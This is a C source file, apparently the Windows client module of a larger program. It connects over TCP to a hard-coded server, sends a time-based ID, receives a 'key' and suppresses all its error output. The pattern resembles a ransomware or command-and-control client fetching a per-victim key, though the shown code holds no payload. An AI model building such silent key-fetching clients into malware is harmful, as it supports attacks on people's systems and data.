#include "libwin.h"

void welcome(){
  printf("Windows detected, let's go !\n\n");
}

SOCKADDR_IN set_addr(){
  SOCKADDR_IN sin = {0};
  sin.sin_addr.s_addr = inet_addr(IP); // set the ip
  sin.sin_port = htons(PORT); // set port
  sin.sin_family = AF_INET; // ip protocol
  return sin;
}

SOCKET set_socket(){
  // create client socket
  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); // ip tcp 
  if (sock == -1) {
    //perror("socket()");
    exit(0);
  }
  return sock;
}

char* get_data(SOCKET sock){
  // receive data
  char* key = calloc(1,LENGTH);
  if(recv(sock, key, LENGTH,0) == -1){
    //printf("[-]Failed receive the key from the server!\n");
  } else {
    //printf("[+] Receied key from the server with success!\n");
  }
  if(key[0] == '\0'){
    return 0;
  }
  return key;
}

void send_ID(SOCKET sock, int* id){
  if(send(sock, id, sizeof(int), 0) == -1){
    //printf("[-] Failed to send the ID...\n");
    return;
  }
  //printf("[+] ID sent successfully !\n");
}

char* net_get(int* ID){
  SOCKET sock = set_socket();
  SOCKADDR_IN sin = set_addr();
  int flag = 1;
  setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));
  // connect to the server
  if(connect(sock, (SOCKADDR *)&sin, sizeof(sin)) == -1){
    //perror("[-] connect()");
    return 0;
  }else{
    //printf("[+] Connected !\n");
  }
  // check ID
  *ID == 0 ? *ID = time(NULL) : 0;
  // create ID
  // *ID = time(NULL); //make_ID();
  // send ID
  send_ID(sock, ID);
  // get data
  char* key = get_data(sock);
  
  // close the socket
  close(sock);
  //printf("[-]Client closed with success!\n");
  return key;
}